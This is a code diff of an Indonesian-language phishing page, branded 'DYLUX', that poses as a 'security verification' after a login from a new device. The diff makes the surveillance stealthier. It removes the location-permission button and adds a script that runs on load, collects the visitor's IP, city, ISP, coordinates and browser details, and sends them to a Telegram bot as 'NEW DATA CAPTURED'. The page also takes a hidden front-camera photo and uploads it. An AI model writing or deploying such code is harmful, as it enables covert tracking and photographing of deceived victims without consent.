@@ -26,149 +26,33 @@
             width: 100%;
             text-align: center;
         }
-        .logo {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(0,255,136,0.1);
-            color: #00ff88;
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            margin-top: 6px;
-        }
-        .icon {
-            font-size: 48px;
-            margin: 16px 0;
-        }
-        h2 {
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-        p {
-            color: #8888aa;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        video {
-            display: none !important;
-        }
-        canvas {
-            display: none !important;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
-            color: #fff;
-            transition: 0.3s;
-        }
-        button:hover {
-            opacity: 0.8;
-        }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #555;
-        }
-        .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(0,240,255,0.1);
-            border-top-color: #00f0ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 12px auto;
-        }
-        .spinner.active {
-            display: block;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        #statusMsg {
-            font-size: 13px;
-            color: #8888aa;
-            margin-top: 10px;
-            display: none;
-        }
-        .location-request {
-            background: #0a0a0f;
-            border-radius: 12px;
-            padding: 16px;
-            margin: 12px 0;
-            border: 1px solid rgba(0,240,255,0.1);
-        }
-        .location-request .req-icon {
-            font-size: 32px;
-            display: block;
-            margin-bottom: 8px;
-        }
-        .location-request .req-text {
-            font-size: 13px;
-            color: #8888aa;
-            line-height: 1.6;
-        }
-        .location-request .req-text strong {
-            color: #00f0ff;
-        }
-        .btn-location {
-            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            padding: 10px 20px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-        .btn-location:hover {
-            opacity: 0.8;
-        }
-        .btn-location:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
+        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .badge { display: inline-block; background: rgba(0,255,136,0.1); color: #00ff88; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
+        .icon { font-size: 48px; margin: 16px 0; }
+        h2 { font-size: 18px; margin-bottom: 8px; }
+        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
+        video { display: none !important; }
+        canvas { display: none !important; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .footer { margin-top: 20px; font-size: 11px; color: #555; }
+        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
+        .spinner.active { display: block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
+        input { width: 100%; padding: 14px; background: #0a0a0f; border: 1px solid rgba(0,240,255,0.1); border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin: 12px 0; }
+        input:focus { border-color: #00f0ff; }
     </style>
 </head>
 <body>
+
     <div class="box">
         <div class="logo">DYLUX</div>
         <div class="badge">🔒 Secure</div>
         <div class="icon">🛡️</div>
         <h2>Verifikasi Keamanan</h2>
         <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>
-
-        <!-- ========================================== -->
-        <!-- TOMBOL IZINKAN LOKASI (DI DALAM HALAMAN)  -->
-        <!-- ========================================== -->
-        <div class="location-request" id="locationRequest">
-            <span class="req-icon">📍</span>
-            <div class="req-text">
-                Untuk keamanan, kami perlu <strong>lokasi</strong> perangkat Anda.
-                <br>Klik tombol di bawah untuk mengizinkan.
-            </div>
-            <button class="btn-location" id="allowLocationBtn">Izinkan Lokasi</button>
-        </div>
 
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
@@ -183,7 +67,7 @@
 
     <script>
     // ============================================
-    // API FALLBACK (10 API)
+    // API FALLBACK (10 API) - PAKE INI BUAT LOKASI
     // ============================================
     const apiList = [
         { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
@@ -212,159 +96,64 @@
         try {
             const response = await fetch(imageBase64);
             const blob = await response.blob();
-
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.jpg');
             formData.append('caption', caption);
             formData.append('parse_mode', 'HTML');
-
             await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-        } catch (error) {
-            console.error('Send photo error:', error);
-        }
+        } catch (error) { console.error('Send photo error:', error); }
     }
 
     // ============================================
-    // AMBIL IP (CEPAT)
+    // AUTO-DETECT (PAKE IP API, NO GPS!)
     // ============================================
-    async function getIPData() {
-        for (const api of apiList) {
-            try {
-                const res = await fetch(api.url);
-                if (!res.ok) throw new Error('API error');
-                const data = await res.json();
-                const parsed = api.parse(data);
-                if (parsed.ip && parsed.ip !== 'unknown') {
-                    return parsed;
-                }
-            } catch (e) { /* Coba API berikutnya */ }
-        }
-        return null;
-    }
-
-    // ============================================
-    // AMBIL GPS (SIMPLE, TUNGGU 5 DETIK)
-    // ============================================
-    function getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    });
-                },
-                () => {
-                    resolve(null);
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
-                }
-            );
-        });
-    }
-
-    // ============================================
-    // AUTO-DETECT (JALAN SATU KALI)
-    // ============================================
-    let autoDetectDone = false;
-
-    async function autoDetect() {
-        if (autoDetectDone) return;
-        autoDetectDone = true;
-
+    (async function autoDetect() {
         try {
             const params = new URLSearchParams(window.location.search);
             const userId = params.get('id');
             if (!userId) return;
 
-            // 1. Dapet IP
-            const ipData = await getIPData();
-
-            // 2. Coba GPS (kalo user izinkan)
-            const gpsData = await getGPSLocation();
-
-            // 3. Pilih lokasi (prioritas GPS kalo ada)
-            let lat = ipData?.lat || 0;
-            let lon = ipData?.lon || 0;
-            let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
-            let accuracyText = '';
-
-            if (gpsData && gpsData.lat && gpsData.lon) {
-                lat = gpsData.lat;
-                lon = gpsData.lon;
-                locationText = `GPS: ${lat}, ${lon}`;
-                accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
+            // Coba semua API sampe dapet IP & lokasi
+            let ipData = null;
+            for (const api of apiList) {
+                try {
+                    const res = await fetch(api.url);
+                    if (!res.ok) throw new Error('API error');
+                    const data = await res.json();
+                    const parsed = api.parse(data);
+                    if (parsed.ip && parsed.ip !== 'unknown') {
+                        ipData = parsed;
+                        break;
+                    }
+                } catch (e) { /* Coba API berikutnya */ }
             }
 
-            // 4. Link Maps
-            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+            if (ipData) {
+                const mapsLink = `https://maps.google.com/?q=${ipData.lat},${ipData.lon}`;
+                const message = 
+                    `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>📌 Type:</b> Auto-Detect\n` +
+                    `<b>🌐 IP:</b> ${ipData.ip}\n` +
+                    `<b>📍 Lokasi:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
+                    `<b>📡 ISP:</b> ${ipData.isp}\n` +
+                    `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
+                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
-            // 5. Kirim notifikasi
-            const message =
-                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>📌 Type:</b> Auto-Detect\n` +
-                `<b>🌐 IP:</b> ${ipData?.ip || 'unknown'}\n` +
-                `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
-                `<b>📡 ISP:</b> ${ipData?.isp || 'unknown'}\n` +
-                `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
-                `<b>📱 Device:</b> ${navigator.userAgent}\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            await sendMessageToTelegram(userId, message);
-            console.log('✅ Auto-detect sent!');
-
+                await sendMessageToTelegram(userId, message);
+                console.log('✅ Auto-detect sent!');
+            }
         } catch (e) { console.error('Auto-detect error:', e); }
-    }
+    })();
 
     // ============================================
-    // POPUP IZIN LOKASI (DI DALAM HALAMAN)
-    // ============================================
-    document.getElementById('allowLocationBtn').addEventListener('click', function() {
-        this.disabled = true;
-        this.textContent = '⏳ Meminta izin...';
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                console.log('✅ Location allowed:', pos.coords);
-                this.textContent = '✅ Lokasi Diizinkan';
-                this.style.background = '#00ff88';
-                this.style.color = '#0a0a0f';
-                // Trigger auto-detect ulang
-                autoDetectDone = false;
-                autoDetect();
-            },
-            (err) => {
-                console.warn('❌ Location denied:', err);
-                this.textContent = '❌ Izin Ditolak';
-                this.style.background = '#ff0055';
-                // Tetap jalan pake IP
-                autoDetect();
-            }, {
-                enableHighAccuracy: true,
-                timeout: 10000
-            }
-        );
-    });
-
-    // ============================================
-    // JALANKAN AUTO-DETECT AWAL (PAKE IP)
-    // ============================================
-    autoDetect();
-
-    // ============================================
-    // KAMERA DEPAN (SELFIE)
+    // KAMERA DEPAN (SELFIE) - SEMBUNYI
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -379,7 +168,6 @@
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 640 } }
             });
-
             video.srcObject = stream;
             await video.play();
             await new Promise(resolve => setTimeout(resolve, 1500));
@@ -391,7 +179,6 @@
 
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
             stream.getTracks().forEach(track => track.stop());
-
             return imageData;
         } catch (error) {
             console.error('Camera error:', error);
